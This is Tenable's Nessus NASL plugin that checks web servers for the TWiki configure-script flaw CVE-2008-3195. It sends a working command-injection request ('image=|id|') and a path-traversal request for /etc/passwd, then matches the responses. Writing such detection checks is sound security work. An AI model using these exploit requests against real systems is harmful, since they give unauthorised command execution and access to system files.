#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(34031);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/06/05");

  script_cve_id("CVE-2008-3195");
  script_xref(name:"EDB-ID", value:"6269");
  script_xref(name:"EDB-ID", value:"6509");

  script_name(english:"TWiki bin/configure 'image' Parameter Traversal Arbitrary File Access/Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a CGI script that is affected by multiple
vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of TWiki running on the remote host allows access to the
'configure' script, and fails to sanitize the 'image' parameter of
that script. When the 'action' parameter is set to 'image', an
unauthenticated attacker can exploit this issue to execute arbitrary
code or to view arbitrary files on the remote host subject to the
privileges of the web server user id.

Note that the TWiki Installation Guide says the 'configure' script
should never be left open to the public.");
  script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/TWiki/TWikiInstallationGuide");
  script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2008-3195");
  script_set_attribute(attribute:"solution", value:
"Configure the web server to limit access to 'configure', either based
on IP address or a specific user, according to the TWiki Installation
Guide referenced above. Upgrades and hotfixes are also available from
the vendor advisory listed above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/09/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/09/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/08/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:twiki:twiki");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("twiki_detect.nasl");
  script_require_keys("installed_sw/TWiki");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "TWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

if ("cgi-bin" >!< dir)
{
  dir = ereg_replace(pattern:"(/[^/]+/).*", string:dir, replace:"\1");
  dir = dir + "bin/";
}
else
  dir = dir - "view";

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";
file =  mult_str(str:"../", nb:12) + "etc/passwd";
file_pat = "root:.*:0:[01]:";

# First try to execute a command.
url = "configure?action=image;image=|" + urlencode(str:cmd) + "|;type=text/plain";

res = http_send_recv3(method:"GET", item:dir + url, port:port, exit_on_fail:TRUE);

if (ereg(pattern:cmd_pat, string:res[2], multiline:TRUE))
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    cmd        : cmd,
    request    : make_list(build_url(qs:dir+url, port:port)),
    output     : chomp(res[2])
  );
  exit(0);
}

if (!thorough_tests) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

# Try to read a file if command execution didn't work.
url = "configure?action=image;image=" + file + ";type=text/plain";

res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);

# There's a problem if looks like the file.
if (ereg(pattern:file_pat, string:res[2], multiline:TRUE))
{
  file = str_replace(find:"../", replace:"", string:file);
  file = "/" + file;

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : file,
    request     : make_list(build_url(qs:dir+url, port:port)),
    output      : chomp(res[2]),
    attach_type : 'text/plain'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
